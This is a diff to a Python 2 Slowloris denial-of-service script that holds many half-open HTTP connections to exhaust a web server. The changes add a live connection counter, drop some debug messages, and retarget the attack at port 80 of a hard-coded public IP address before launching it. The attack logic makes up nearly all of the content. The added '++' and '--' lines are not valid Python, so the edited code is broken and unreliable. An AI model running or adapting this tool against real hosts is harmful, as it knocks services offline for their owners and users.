@@ -31,6 +31,8 @@ class Loris:
             print "Something is going horribly wrong"
             return
 
+        self.activeConnections = 0
+
         i = 0
         while i < self.totalConnections:
             print "starting a thread for connections " +\
@@ -60,7 +62,6 @@ class Loris:
             try:
                 sent = sock.send(payload)
             except:
-                print "something went wrong"
                 return -1
         for i in range(1, self.MAX_TIMEOUT):
             print "Attempting a " + str(i) + " second timeout"
@@ -69,7 +70,7 @@ class Loris:
             try:
                 sent = sock.send(message)
             except socket.error, e:
-                print "timeout determined to be " + str(i - 1)
+                print "Timeout determined to be " + str(i - 1)
                 return i - 1
         return self.MAX_TIMEOUT
 
@@ -91,10 +92,9 @@ class Loris:
                     try:
                         sockets[i] = socket.create_connection((self.addr, self.port))
                         working[i] = True
-                        print "Connection success!"
+                        self.activeConnections++
                     except:
                         working[i] = False
-                        print "Failure establishing connection"
                 if working[i]:
                     payload = "GET HTTP/1.1\r\n" +\
                     "Host: " + str(self.addr) + ":" + str(self.port) + "\r\n" +\
@@ -103,10 +103,9 @@ class Loris:
                     if sockets[i] is not None:
                         try:
                             sockets[i].send(payload)
-                            print "Header success!"
                         except:
                             working[i] = False
-                            print "Failure sending header"
+                            self.activeConnections--
 
             """ Send data """
             for i in range(0, self.connectionsPerThread):
@@ -116,16 +115,16 @@ class Loris:
                         message = "X-a: b\r\n"
                         try:
                             sock.send(message)
-                            print "Increment success!"
                         except:
                             working[i] = False
-                            print "Failure sending increment"
+                            self.activeConnections--
 
             """ Sleep for timeout """
+            print "Currently active connections: " + str(self.activeConnections)
             time.sleep(self.timeout)
 
 def main():
-    loris = Loris(addr = "54.235.164.48", port = 8008, totalConnections = 1000)
+    loris = Loris(addr = "54.235.164.48", port = 80, totalConnections = 1000)
     loris.initiateAttack()
 
 if __name__ == "__main__":
